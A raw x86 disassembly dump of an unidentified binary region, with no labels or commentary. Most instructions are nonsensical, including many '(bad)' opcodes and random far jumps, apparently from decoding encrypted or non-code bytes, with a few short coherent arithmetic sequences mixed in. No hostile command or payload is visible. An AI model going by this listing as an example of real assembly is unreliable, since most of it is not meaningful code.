  4129fb:	cmp    BYTE PTR [esi+edi*8],al
  4129fe:	pop    es
  4129ff:	xchg   ebx,eax
  412a00:	call   0x3962:0x3693dba3
  412a07:	pushf  
  412a08:	iret   
  412a09:	dec    esp
  412a0a:	inc    ecx
  412a0b:	sub    edx,DWORD PTR [ecx]
  412a0d:	mov    ch,0x2b
  412a0f:	push   0x58d26759
  412a14:	pop    edi
  412a15:	push   esp
  412a16:	and    bh,BYTE PTR [esi+0x23]
  412a19:	mov    esi,0x6bbdb83d
  412a1e:	inc    ebp
  412a1f:	jl     0x412a66
  412a21:	sbb    BYTE PTR [edx+eiz*1-0x2c],bh
  412a25:	inc    edx
  412a26:	push   edi
  412a27:	loopne 0x4129e1
  412a29:	pop    ebx
  412a2a:	js     0x4129dc
  412a2c:	jo     0x412a24
  412a2e:	fld    TBYTE PTR [esi+0x3596a454]
  412a34:	xor    ebp,DWORD PTR [esp+edx*4-0x37f3bcb4]
  412a3b:	mov    BYTE PTR [ecx+0x60],al
  412a3e:	ficomp WORD PTR [edi]
  412a40:	test   BYTE PTR [eax-0x227b54d9],bh
  412a46:	push   ds
  412a47:	add    edx,esp
  412a49:	push   esp
  412a4a:	sub    DWORD PTR [esi+ebp*2-0x17],0xfffffff0
  412a4f:	hlt    
  412a50:	or     esp,ebp
  412a52:	call   0x25da:0xc77890e7
  412a59:	sbb    DWORD PTR [ebp-0x26],esi
  412a5c:	rol    esi,0x17
  412a5f:	push   ds
  412a60:	or     dh,al
  412a62:	jg     0x412a52
  412a64:	test   DWORD PTR [edx+ecx*8+0x17],edx
  412a68:	pop    eax
  412a69:	cmp    al,BYTE PTR [edx-0x3218c0da]
  412a6f:	add    eax,0xa8b8eba9
  412a74:	adc    BYTE PTR [esi],0xd9
  412a77:	sub    ebp,0xffffff83
  412a7a:	outs   dx,BYTE PTR fs:[esi]
  412a7c:	and    ebp,ecx
  412a7e:	test   al,0xd
  412a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a81:	in     eax,dx
  412a82:	test   DWORD PTR [esi-0x7f],0xfda65cfe
  412a89:	adc    BYTE PTR [edi-0x70],bh
  412a8c:	mov    esi,0x612df856
  412a91:	xor    DWORD PTR ds:0x606c8bc5,eax
  412a97:	and    BYTE PTR cs:[ebp-0x4f],ah
  412a9b:	(bad)  
  412a9c:	sahf   
  412a9d:	sbb    DWORD PTR [ebp+0x304921ac],ebx
  412aa3:	(bad)  
  412aa4:	icebp  
  412aa5:	leave  
  412aa6:	sub    DWORD PTR [eax-0x11f42d7],edx
  412aac:	xor    eax,0x26b29c7f
  412ab1:	or     DWORD PTR ds:0xb754884,ecx
  412ab7:	jmp    0x412ada
  412ab9:	cli    
  412aba:	jg     0x412add
  412abc:	add    eax,0x848215f
  412ac1:	inc    esp
  412ac2:	push   cs
  412ac3:	out    dx,eax
  412ac4:	sub    ch,bl
  412ac6:	xor    edx,DWORD PTR [eax-0x54]
  412ac9:	bound  ecx,QWORD PTR [eax]
  412acb:	je     0x412aa8
  412acd:	xchg   ebp,eax
  412ace:	add    DWORD PTR [ecx],ebp
  412ad0:	pop    ecx
  412ad1:	cdq    
  412ad2:	jge    0x412acd
  412ad4:	lods   al,BYTE PTR ds:[esi]
  412ad5:	inc    ebp
  412ad6:	out    0x9,eax
  412ad8:	xor    BYTE PTR [edx-0x73b3e071],ch
  412ade:	in     al,dx
  412adf:	sbb    ebx,0x17
  412ae2:	repz xlat BYTE PTR ds:[ebx]
  412ae4:	or     eax,0xa5095464
  412ae9:	ret    
  412aea:	mov    edx,0xc375bdd4
  412aef:	mov    eax,0xe81ce861
  412af4:	ja     0x412aff
  412af6:	fbstp  TBYTE PTR [ebx-0x13]
  412af9:	ror    esi,1
  412afb:	ret    
  412afc:	or     ebx,0x26
  412aff:	sub    ebp,DWORD PTR [ebp+eiz*1-0x473efbd8]
  412b06:	cmp    eax,0x751d1e1e
  412b0b:	adc    esp,DWORD PTR [esi]
  412b0d:	call   0xd06a:0x1e4ded83
  412b14:	ins    BYTE PTR es:[edi],dx
  412b15:	mov    al,ds:0x9600362
  412b1a:	mov    ebp,0x76f1f40
  412b1f:	cmp    ecx,DWORD PTR [esi]
  412b21:	inc    esi
  412b22:	shl    BYTE PTR [edx-0xaadd8f1],1
  412b28:	popa   
  412b29:	mov    al,ds:0x3177163e
  412b2e:	xchg   edi,eax
  412b2f:	mov    dh,0xdc
  412b31:	or     al,0xc4
  412b33:	cmp    BYTE PTR [ecx],0x3c
  412b36:	push   eax
  412b37:	dec    eax
  412b38:	test   esi,esp
  412b3a:	xchg   ebp,eax
  412b3b:	jle    0x412b7b
  412b3d:	int3   
  412b3e:	push   cs
  412b3f:	aam    0xc5
  412b41:	pop    es
  412b42:	aas    
  412b43:	and    eax,0x9daab3fc
  412b48:	inc    edi
  412b49:	push   ebp
  412b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b4b:	aad    0x2c
  412b4d:	and    eax,0xf11dcadc
  412b52:	fbstp  TBYTE PTR [edx-0x8]
  412b55:	(bad)  
  412b56:	mov    esp,0xa6b4b3c8
  412b5b:	jmp    0x5b2621b0
  412b60:	jb     0x412b69
  412b62:	xor    BYTE PTR ds:0x414facb0,0x49
  412b69:	pop    eax
  412b6a:	jmp    0x2ea8:0x4641cd16
  412b71:	add    dl,cl
  412b73:	mov    edi,0x2c90c9fd
  412b78:	xlat   BYTE PTR ds:[ebx]
  412b79:	and    bl,BYTE PTR [ebp+0x54]
  412b7c:	repz loopne 0x412b8a
  412b7f:	paddusb mm6,QWORD PTR [ebx]
  412b82:	shr    DWORD PTR [ebp+0x5bd6535e],cl
  412b88:	xor    BYTE PTR [ecx],cl
  412b8a:	pop    eax
  412b8b:	mov    eax,0xad8799b9
  412b90:	cld    
  412b91:	jg     0x412b8b
  412b93:	cld    
  412b94:	dec    esi
  412b95:	push   ebp
  412b96:	and    ah,ah
  412b98:	out    dx,eax
  412b99:	add    esi,ecx
  412b9b:	jl     0x412bbf
  412b9d:	mov    eax,0xd8c6bac3
  412ba2:	lds    esi,FWORD PTR [eax]
  412ba4:	clc    
  412ba5:	icebp  
  412ba6:	icebp  
  412ba7:	sbb    al,0x52
  412ba9:	push   0x58
  412bab:	lods   al,BYTE PTR ds:[esi]
  412bac:	imul   ebx,DWORD PTR [edi],0xfffffffa
  412baf:	xor    bh,BYTE PTR [ebx]
  412bb1:	add    DWORD PTR [edx-0x145774e1],esi
  412bb7:	adc    bh,0x8a
  412bba:	iret   
  412bbb:	int3   
  412bbc:	or     eax,0x2ccf6ce4
  412bc1:	jno    0x412b73
  412bc3:	adc    ebp,DWORD PTR [ebp-0x167328a6]
  412bc9:	pop    eax
  412bca:	hlt    
  412bcb:	loopne 0x412bdb
  412bcd:	ret    
  412bce:	xchg   ebx,eax
  412bcf:	int3   
  412bd0:	(bad)  
  412bd1:	xor    eax,0x812fbed1
  412bd6:	std    
  412bd7:	mov    ah,0xfe
  412bd9:	xor    cl,BYTE PTR [edi+0x7e]
  412bdc:	sub    BYTE PTR [esi+0x28fc74d9],dl
  412be2:	pop    edx
  412be3:	push   cs
  412be4:	call   0x9ef596b3
  412be9:	ds scas al,BYTE PTR es:[edi]
  412beb:	cmp    ch,dh
  412bed:	in     eax,dx
  412bee:	push   ebx
  412bef:	xchg   edx,eax
  412bf0:	dec    edx
  412bf1:	add    dl,BYTE PTR [ecx+0x4e8328c7]
  412bf7:	js     0x412c6f
  412bf9:	(bad)
  412bfc:	jp     0x412bd6
  412bfe:	inc    ebx
  412bff:	mov    dl,0x42
  412c01:	cdq    
  412c02:	sbb    DWORD PTR [esi+eax*4+0x5e73c5c1],eax
  412c09:	add    eax,0xebe374cb
  412c0e:	mov    ah,0xc7
  412c10:	add    DWORD PTR [ebp-0x6],esi
  412c13:	lock fist WORD PTR [eax]
  412c16:	sete   BYTE PTR [edi+0x38dd5b49]
  412c1d:	test   al,0xe5
  412c1f:	repnz mov fs,WORD PTR [esi-0x3a5d0a7e]
  412c26:	xor    al,0x21
  412c28:	or     DWORD PTR gs:[edi-0x254459de],edi
  412c2f:	adc    BYTE PTR ds:0x7b759bf6,0xe8
  412c36:	or     eax,0x6eeb71a8
  412c3b:	ja     0x412c54
  412c3d:	xor    BYTE PTR [edi+0x5c9e644d],0xa
  412c44:	dec    esi
  412c45:	lahf   
  412c46:	sti    
  412c47:	fcmove st,st(2)
  412c49:	fisttp WORD PTR [esi]
  412c4b:	sahf   
  412c4c:	adc    esi,DWORD PTR [ebx+0x9]
  412c4f:	fldenv [edi-0xe]
  412c52:	dec    ecx
  412c53:	iret   
  412c54:	in     eax,dx
  412c55:	xchg   esp,eax
  412c56:	cs jo  0x412c95
  412c59:	or     esp,edx
  412c5b:	jb     0x412cb0
  412c5d:	daa    
  412c5e:	stos   BYTE PTR es:[edi],al
  412c5f:	out    dx,eax
  412c60:	cwde   
  412c61:	xchg   esi,eax
  412c62:	dec    ebp
  412c63:	ret    
  412c64:	ins    BYTE PTR es:[edi],dx
  412c65:	inc    ebp
  412c66:	aam    0x2d
  412c68:	or     BYTE PTR [ebp+0x70],bl
  412c6b:	sub    cl,dh
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0x7c793ca0
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [edi-0x2f],bl
  412caf:	(bad)  
  412cb0:	fidiv  WORD PTR [edx+edi*2-0x2]
  412cb4:	mov    ebp,0x6665507b
  412cb9:	inc    eax
  412cba:	mov    dl,BYTE PTR [eax-0x6e]
  412cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cbe:	push   ebx
  412cbf:	xchg   edx,eax
  412cc0:	mov    DWORD PTR [edx],ebx
  412cc2:	dec    edi
  412cc3:	(bad)  
  412cc4:	enter  0x87be,0x27
  412cc8:	shr    BYTE PTR [esi],cl
  412cca:	jmp    0x455b3e6e
  412ccf:	ins    DWORD PTR es:[edi],dx
  412cd0:	test   dh,0xee
  412cd3:	out    0xeb,eax
  412cd5:	inc    esp
  412cd6:	cmp    eax,0x7ccc5b9c
  412cdb:	sub    eax,0xa47acd9c
  412ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce1:	fist   DWORD PTR [eax+ebx*1-0x655efe52]
  412ce8:	jl     0x412d4e
  412cea:	das    
  412ceb:	sbb    al,BYTE PTR [edx+0x38d2cf44]
  412cf1:	enter  0xa52b,0x68
  412cf5:	cdq    
  412cf6:	mov    WORD PTR [esi],es
  412cf8:	and    BYTE PTR [ebx-0x11],cl
  412cfb:	shl    DWORD PTR [eax+0x45],cl
  412cfe:	inc    ecx
  412cff:	fdivr  QWORD PTR [ecx+0x7c]
  412d02:	(bad)  [eax]
  412d04:	popa   
  412d05:	and    esp,DWORD PTR [eax]
  412d07:	iret   
  412d08:	aas    
  412d09:	stos   BYTE PTR es:[edi],al
  412d0a:	push   edi
  412d0b:	das    
  412d0c:	ins    DWORD PTR es:[edi],dx
  412d0d:	inc    edx
  412d0e:	cmp    DWORD PTR [edi+0x3d1a9d21],ecx
  412d14:	aam    0x28
  412d16:	cli    
  412d17:	xchg   ebp,eax
  412d18:	xor    al,0x63
  412d1a:	mov    ds:0xdaee9928,eax
  412d1f:	push   ebp
  412d20:	sub    eax,0xef5b71d1
  412d25:	(bad)  
  412d27:	adc    BYTE PTR [ecx-0x4],bh
  412d2a:	les    edi,FWORD PTR [edx+ebx*1]
  412d2d:	mov    eax,ds:0xe9e8c963
  412d32:	cli    
  412d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d34:	mov    ch,bl
  412d36:	sti    
  412d37:	outs   dx,DWORD PTR ds:[esi]
  412d38:	test   eax,0x338fc7b
  412d3d:	hlt    
  412d3e:	(bad)  
  412d3f:	int    0x4b
  412d41:	ins    DWORD PTR es:[edi],dx
  412d42:	adc    eax,0xc1568ad0
  412d47:	es imul esi,ebx,0xffffffbc
  412d4b:	ret    0x3dd1
  412d4e:	mov    edx,0x7ac04e5a
  412d53:	mov    WORD PTR [ebx+0x3b],es
  412d56:	scas   al,BYTE PTR es:[edi]
  412d57:	mov    ecx,0x27f95b6d
  412d5c:	cmp    ebx,DWORD PTR ds:0x6ee8a392
  412d62:	mov    dl,0xa8
  412d64:	xlat   BYTE PTR ds:[ebx]
  412d65:	mov    ebp,0xd477986a
  412d6a:	push   ecx
  412d6b:	(bad)  
  412d6c:	mov    ?,WORD PTR [ecx-0x3f940bc6]
  412d72:	cs icebp 
  412d74:	(bad)  
  412d75:	out    0xee,eax
  412d77:	retf   
  412d78:	add    DWORD PTR [ecx+0xf7116cd],esp
  412d7e:	mov    ah,0xfb
  412d80:	cmp    dh,BYTE PTR ds:0x2290010c
  412d86:	dec    edi
  412d87:	test   DWORD PTR [ebp+0x4bb6ff8c],edi
  412d8d:	fmul   DWORD PTR [eax+0x3fe4a39e]
  412d93:	jle    0x412d28
  412d95:	jge    0x412e0c
  412d97:	mov    ch,0xe
  412d99:	sub    DWORD PTR [ecx+0x6a51ff3a],esp
  412d9f:	stos   DWORD PTR es:[edi],eax
  412da0:	jg     0x412d73
  412da2:	cdq    
  412da3:	and    bl,dl
  412da5:	mov    ss,WORD PTR [esi+eiz*4-0x1c948103]
  412dac:	fwait
  412dad:	pop    ecx
  412dae:	loope  0x412db6
  412db0:	(bad)  
  412db2:	jns    0x412de7
  412db4:	xor    BYTE PTR [ebx+0xb10d00],dl
  412dba:	ins    BYTE PTR es:[edi],dx
  412dbb:	pop    esp
  412dbc:	inc    eax
  412dbd:	aad    0x5c
  412dbf:	push   cs
  412dc0:	(bad)  
  412dc1:	and    BYTE PTR [edx-0x4c3befd],dh
  412dc7:	inc    ecx
  412dc8:	add    al,0x2c
  412dca:	mov    bh,0x2b
  412dcc:	pop    es
  412dcd:	jmp    0x412dd6
  412dcf:	jecxz  0x412d6d
  412dd1:	aas    
  412dd2:	jne    0x412dd5
  412dd4:	xor    eax,0xce240f10
  412dd9:	mov    ss,WORD PTR [edi]
  412ddb:	inc    esp
  412ddc:	mov    es,ecx
  412dde:	sub    eax,0x1ffdc159
  412de3:	mov    bl,0x56
  412de5:	lods   eax,DWORD PTR ds:[esi]
  412de6:	in     al,dx
  412de7:	pop    ss
  412de8:	fild   DWORD PTR [edx-0x10e2cad6]
  412dee:	imul   DWORD PTR [eax+0x49]
  412df1:	cmp    DWORD PTR [edx],0x3759679e
  412df7:	lds    ebp,FWORD PTR [edi+0x29]
  412dfa:	push   esp
  412dfb:	mov    BYTE PTR [ebx+0x16],bh
  412dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dff:	fwait
  412e00:	push   ds
  412e01:	fdivp  st(2),st
  412e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e04:	ja     0x412e0e
  412e06:	loope  0x412dc5
  412e08:	jge    0x412e03
  412e0a:	mov    dl,0x89
  412e0c:	sar    BYTE PTR ds:0xf7be2270,0x17
  412e13:	lods   eax,DWORD PTR ds:[esi]
  412e14:	mul    BYTE PTR [edx+eax*4]
  412e17:	sar    DWORD PTR [eax],0xe2
  412e1a:	dec    esp
  412e1b:	adc    bh,dl
  412e1d:	dec    edi
  412e1e:	fcom   st(6)
  412e20:	aad    0x5d
  412e22:	xchg   edi,eax
  412e23:	out    0xbb,al
  412e25:	and    esi,DWORD PTR [ebp+0x11]
  412e28:	js     0x412e31
  412e2a:	push   cs
  412e2b:	pushf  
  412e2c:	inc    ebx
  412e2d:	jne    0x412e50
  412e2f:	aad    0x54
  412e31:	lds    edi,FWORD PTR [ebp-0x47]
  412e34:	bound  ebx,QWORD PTR [edx+0x630a5269]
  412e3a:	(bad)  
  412e3b:	adc    BYTE PTR [ecx+0x17c686dd],cl
  412e41:	xchg   esi,eax
  412e42:	jge    0x412e8a
  412e44:	scas   al,BYTE PTR es:[edi]
  412e45:	cs mov ebp,0x250c6600
  412e4b:	lea    esi,[eax]
  412e4d:	or     eax,0xd732580b
  412e52:	daa    
  412e53:	push   0xdb1c4299
  412e58:	dec    esi
  412e59:	dec    edi
  412e5a:	std    
  412e5b:	adc    bh,dl
  412e5d:	(bad)  
  412e5e:	mov    edx,0xf3235e8c
  412e63:	mov    ch,0x0
  412e65:	or     bh,ch
  412e67:	push   ecx
  412e68:	and    bl,BYTE PTR [esi+0x57]
  412e6b:	int    0x82
  412e6d:	lock into 
  412e6f:	xchg   ecx,eax
  412e70:	cmp    ch,dh
  412e72:	adc    ecx,ecx
  412e74:	adc    al,0x26
  412e76:	int3   
  412e77:	sbb    eax,esp
  412e79:	xchg   edx,eax
  412e7a:	xchg   esi,eax
  412e7b:	cmp    cl,dh
  412e7d:	fdiv   st(3),st
  412e7f:	and    bh,BYTE PTR [ecx]
  412e81:	adc    DWORD PTR [edi-0x4a8ff504],0x303a9acc
  412e8b:	or     eax,0x962f72ca
  412e90:	push   0x30
  412e92:	pop    es
  412e93:	sub    edx,eax
  412e95:	and    al,0x92
  412e97:	cmc    
  412e98:	mov    ds,WORD PTR [ebx-0x32]
  412e9b:	gs cdq 
  412e9d:	imul   ebp,DWORD PTR [ecx+0x27],0x29
  412ea1:	sar    edi,0x52
  412ea4:	(bad)  
  412ea5:	(bad)  
  412ea6:	push   ebp
  412ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea8:	or     ecx,DWORD PTR [edi+0x3c767615]
  412eae:	jl     0x412f12
  412eb0:	inc    eax
  412eb1:	cmp    cl,BYTE PTR [eax]
  412eb3:	dec    ebx
  412eb4:	add    BYTE PTR [eax-0x1a],bl
  412eb7:	xor    DWORD PTR [esi-0x43],esp
  412eba:	mov    ds:0x25a5b5a2,al
  412ebf:	mov    eax,0x98293e5a
  412ec4:	mov    ebp,0x59edeb47
  412ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eca:	pop    ss
  412ecb:	and    DWORD PTR [edi-0x7042ca6a],esp
  412ed1:	mul    BYTE PTR [esi+0x7a]
  412ed4:	jmp    0x3641:0xd219074d
  412edb:	jmp    FWORD PTR [eax]
  412edd:	idiv   DWORD PTR [edx+0x6e0d3022]
  412ee3:	sbb    al,0x31
  412ee5:	js     0x412f2c
  412ee7:	inc    ecx
  412ee8:	push   esp
  412ee9:	popa   
  412eea:	dec    ecx
  412eeb:	clc    
  412eec:	mov    bl,0x18
  412eee:	(bad)  
  412eef:	jge    0x412e71
  412ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef2:	cld    
  412ef3:	fmul   QWORD PTR [ebp-0x3ff9670]
  412ef9:	jo     0x412f07
  412efb:	hlt    
  412efc:	inc    edi
  412efd:	(bad)  
  412eff:	loopne 0x412f02
  412f01:	stc    
  412f02:	leave  
  412f03:	and    BYTE PTR ds:0xa045232e,bh
  412f09:	adc    DWORD PTR [ebx],edx
  412f0b:	push   esp
  412f0c:	(bad)  
  412f0d:	or     al,bl
  412f0f:	retf   0x2edd
  412f12:	sbb    dh,BYTE PTR [ecx*8-0x51db6997]
  412f19:	sbb    eax,0xa05f1382
  412f1e:	lahf   
  412f1f:	cmp    BYTE PTR ds:0x640b9544,0xa9
  412f26:	iret   
  412f27:	lods   al,BYTE PTR ds:[esi]
  412f28:	arpl   ax,di
  412f2a:	enter  0x9000,0xdc
  412f2e:	mov    edi,0xcf5da29e
  412f33:	push   es
  412f34:	inc    ecx
  412f35:	jno    0x412fb1
  412f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f38:	aam    0x95
  412f3a:	mov    ebp,cs
  412f3c:	cmp    edx,esp
  412f3e:	mov    bh,BYTE PTR [eax+eiz*2+0x19]
  412f42:	push   edi
  412f43:	add    eax,0xcdafcd58
  412f48:	nop
  412f49:	jns    0x412fad
  412f4b:	cmp    dl,BYTE PTR [esi+ebx*8-0x15216ee7]
  412f52:	jb     0x412f70
  412f54:	mov    bl,0x46
  412f56:	aas    
  412f57:	pop    esp
  412f58:	adc    BYTE PTR [ecx+eiz*1+0x42],dh
  412f5c:	mov    esi,0x7dcdf6e8
  412f61:	mov    ebx,0x9d9a8acd
  412f66:	in     al,dx
  412f67:	push   ebx
  412f68:	mov    cl,BYTE PTR [edx+0x24743554]
  412f6e:	imul   esp,esi,0xffffffc5
  412f71:	xlat   BYTE PTR ds:[ebx]
  412f72:	pop    ecx
  412f73:	inc    edx
  412f74:	test   al,0x5f
  412f76:	add    eax,0xc618d246
  412f7b:	add    eax,0x2edf6abc
  412f80:	test   DWORD PTR [ebx-0x2a6f0b24],ecx
  412f86:	cld    
  412f87:	lods   eax,DWORD PTR ds:[esi]
  412f88:	into   
  412f89:	loop   0x412f48
  412f8b:	(bad)
  412f8e:	test   esp,0xa8cf6369
  412f94:	std    
  412f95:	cmc    
  412f96:	mov    al,0x65
  412f98:	pop    ebp
  412f99:	pop    ds
  412f9a:	loope  0x413005
  412f9c:	dec    edx
  412f9d:	push   cs
  412f9e:	push   edx
  412f9f:	arpl   WORD PTR [esi-0x693b2584],bx
  412fa5:	mov    eax,ds:0x9188341c
  412faa:	mov    BYTE PTR [ebx-0x2f],dh
  412fad:	sbb    BYTE PTR [esp+eiz*2+0x11257df1],ch
  412fb4:	das    
  412fb5:	jmp    0xbf44:0xf108853a
  412fbc:	adc    al,0xa3
  412fbe:	fst    QWORD PTR [eax-0x29b2a67e]
  412fc4:	and    al,0xf5
  412fc6:	pop    eax
  412fc7:	dec    esp
  412fc8:	gs adc eax,0x4c95af74
  412fce:	dec    edx
  412fcf:	xchg   ecx,eax
  412fd0:	push   edx
  412fd1:	fld    TBYTE PTR [ebx+0x16]
  412fd4:	addr16 mov dl,0x9e
  412fd7:	sub    DWORD PTR [ebx+0x44b46246],eax
  412fdd:	(bad)  
  412fde:	(bad)  
  412fdf:	icebp  
  412fe0:	adc    al,0xdc
  412fe2:	xor    eax,ebp
  412fe4:	rcl    DWORD PTR [eax-0x4cea9199],0x2b
  412feb:	loope  0x412f80
  412fed:	cmp    BYTE PTR [edx],bh
  412fef:	imul   BYTE PTR [eax-0x76]
  412ff2:	pop    esp
  412ff3:	mov    esp,es
  412ff5:	add    eax,0x621eaa5d
  412ffa:	sub    DWORD PTR [edi-0x5e74730d],eax
  413000:	mov    al,ds:0xb392d2a2
  413005:	dec    edi
  413006:	jae    0x413028
  413008:	jp     0x413078
  41300a:	les    ecx,FWORD PTR [ebp-0x45]
  41300d:	cmp    BYTE PTR [ebp+0x65],dh
  413010:	shr    DWORD PTR [ebp-0x7c],cl
  413013:	dec    edx
  413014:	add    al,0x89
  413016:	shr    DWORD PTR [eax+edx*8+0x68fe31ca],cl
  41301d:	fisub  DWORD PTR [eax+0x2d]
  413020:	inc    edi
  413021:	mov    cs,eax
  413023:	xor    DWORD PTR [ecx-0x21],esi
  413026:	xor    al,ah
  413028:	aas    
  413029:	ret    0xe7f4
  41302c:	jnp    0x413035
  41302e:	sub    edi,DWORD PTR [esi]
  413030:	hlt    
  413031:	sbb    ebx,esp
  413033:	repnz sub eax,0xeb334826
  413039:	pop    es
  41303a:	sub    DWORD PTR [ebp-0x29],ebp
  41303d:	sti    
  41303e:	inc    ebx
  41303f:	imul   esi,DWORD PTR [esi-0x5e],0x8bf21f61
  413046:	icebp  
  413047:	int    0xb9
  413049:	or     eax,0xdeb37387
  41304e:	out    0x92,eax
  413050:	bound  edx,QWORD PTR [ebx+edx*8-0x351df3d6]
  413057:	fdiv   DWORD PTR [ebp-0x50]
  41305a:	in     al,dx
  41305b:	xor    al,0xaf
  41305d:	popf   
  41305e:	mov    eax,ds:0xfb280e9f
  413063:	idiv   ah
  413065:	adc    DWORD PTR [esi-0x17afae07],ebp
  41306b:	in     eax,dx
  41306c:	out    dx,eax
  41306d:	add    BYTE PTR [eax],al
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [esi+ecx*1-0x67],edi
  4130e0:	daa    
  4130e1:	stos   BYTE PTR es:[edi],al
  4130e2:	ror    DWORD PTR [eax+0x18],cl
  4130e5:	sbb    BYTE PTR [edx-0x57e7e7ee],ch
  4130eb:	fcom   QWORD PTR [edx+0x27]
  4130ee:	and    al,0x75
  4130f0:	test   DWORD PTR [ecx-0x36],edx
  4130f3:	sub    DWORD PTR [ebp-0x7],ecx
  4130f6:	mov    bl,0x12
  4130f8:	es xchg esp,eax
  4130fa:	pop    edi
  4130fb:	loope  0x413174
  4130fd:	mov    DWORD PTR [edx-0x3828c1f6],ebx
  413103:	out    0x55,al
  413105:	mov    esp,0x7952d51
  41310a:	push   ecx
  41310b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41310c:	mov    ds,WORD PTR [ebx+edi*8-0x34]
  413110:	(bad)  
  413111:	cmp    DWORD PTR [ebp-0x2a],ebx
  413114:	push   ebp
  413115:	jmp    0x413192
  413117:	jl     0x41316a
  413119:	sbb    al,0x8d
  41311b:	pop    esp
  41311c:	pushf  
  41311d:	in     eax,0x67
  41311f:	push   eax
  413120:	cmp    DWORD PTR [esi-0x4f],esi
  413123:	dec    esi
  413124:	adc    DWORD PTR [edx+0x6b],ebx
  413127:	adc    BYTE PTR [eax+0x65],dl
  41312a:	mov    ecx,0xeb1f15d1
  41312f:	cld    
  413130:	retf   
  413131:	in     eax,0x79
  413133:	sbb    al,0x8e
  413135:	fistp  QWORD PTR [ebx]
  413137:	jp     0x4131b8
  413139:	cmp    esp,DWORD PTR [ecx-0x73152b9e]
  41313f:	dec    edi
  413140:	sub    cl,BYTE PTR [esp+ebp*4+0x65]
  413144:	ret    
  413145:	inc    edi
  413146:	inc    edi
  413147:	jb     0x413105
  413149:	pop    es
  41314a:	mov    ds:0x334cd6a7,al
  41314f:	rol    BYTE PTR [ebp-0x73612448],0xd
  413156:	iret   
  413157:	aam    0xa
  413159:	adc    ebp,0x119ebbdc
  41315f:	pop    ecx
  413160:	jge    0x413195
  413162:	int    0xa5
  413164:	fs pop eax
  413166:	leave  
  413167:	xor    BYTE PTR [ebp-0x33],0x55
  41316b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41316c:	mov    esi,0x429934b2
  413171:	mov    DWORD PTR [edi],0x47bdfd3b
  413177:	inc    edx
  413178:	out    dx,al
  413179:	cdq    
  41317a:	fcomp  QWORD PTR [esi]
  41317c:	xor    cl,BYTE PTR [eax+0x1ee1d8d1]
  413182:	clc    
  413183:	cmp    al,0x47
  413185:	(bad)  
  413186:	ins    BYTE PTR es:[edi],dx
  413187:	(bad)  
  413188:	scas   al,BYTE PTR es:[edi]
  413189:	jne    0x413203
  41318b:	test   eax,0x500186b2
  413190:	pop    ds
  413191:	sar    BYTE PTR [ebx],1
  413193:	cmc    
  413194:	sub    DWORD PTR [eax+0x64],ebx
  413197:	push   ecx
  413198:	sbb    ecx,DWORD PTR [edi-0x1aab51ca]
  41319e:	pop    ebx
  41319f:	enter  0x7c6,0x2e
  4131a3:	xchg   ebx,eax
  4131a4:	and    DWORD PTR [eax+0x3c],ebx
  4131a7:	dec    ebx
  4131a8:	inc    edi
  4131a9:	(bad)
  4131ac:	aas    
  4131ad:	rcl    ecx,1
  4131af:	test   DWORD PTR [ecx],esp
  4131b1:	inc    edx
  4131b2:	stos   BYTE PTR es:[edi],al
  4131b3:	mov    dl,0x1a
  4131b5:	push   esi
  4131b6:	dec    dx
  4131b8:	sbb    DWORD PTR [esi],ebp
  4131ba:	mov    esp,0x463f702
  4131bf:	or     al,0x1d
  4131c1:	dec    eax
  4131c2:	pop    ebx
